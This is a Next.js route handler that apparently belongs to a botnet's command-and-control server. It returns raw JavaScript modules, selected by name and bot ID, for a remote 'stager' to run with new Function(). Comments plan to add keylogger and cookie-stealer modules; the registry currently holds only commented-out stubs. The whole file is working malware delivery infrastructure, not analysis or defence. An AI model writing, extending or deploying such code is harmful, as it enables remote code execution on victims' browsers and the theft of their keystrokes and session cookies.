import { NextRequest, NextResponse } from "next/server";

// In Phase 3, modules will be stored in Supabase Storage or a `modules` table.
// For now, this endpoint returns a placeholder or empty response.
// Modules are plain JavaScript strings that the stager executes via `new Function()`.

const MODULE_REGISTRY: Record<string, string> = {
    // Placeholder modules — Phase 3 will populate these
    // "keylogger": "console.log('keylogger loaded');",
    // "cookie_stealer": "console.log('cookie_stealer loaded');",
};

export async function GET(request: NextRequest) {
    try {
        const moduleName = request.nextUrl.searchParams.get("name");
        const botId = request.nextUrl.searchParams.get("bot_id");

        if (!moduleName || !botId) {
            return new NextResponse("Missing params", { status: 400 });
        }

        const moduleCode = MODULE_REGISTRY[moduleName];

        if (!moduleCode) {
            return new NextResponse("Module not found", { status: 404 });
        }

        // Return raw JavaScript
        return new NextResponse(moduleCode, {
            headers: { "Content-Type": "application/javascript" },
        });
    } catch (e) {
        console.error("Module fetch error:", e);
        return new NextResponse("Internal error", { status: 500 });
    }
}
